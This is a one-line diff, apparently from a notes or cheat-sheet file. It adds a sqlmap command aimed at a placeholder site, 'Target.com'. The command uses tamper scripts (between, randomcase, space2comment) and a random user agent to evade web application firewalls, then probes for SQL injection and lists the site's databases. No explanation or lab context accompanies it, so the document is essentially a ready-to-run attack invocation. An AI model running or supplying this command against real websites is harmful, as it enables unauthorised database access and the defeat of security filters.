@@ -1,0 +1,1 @@
+sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
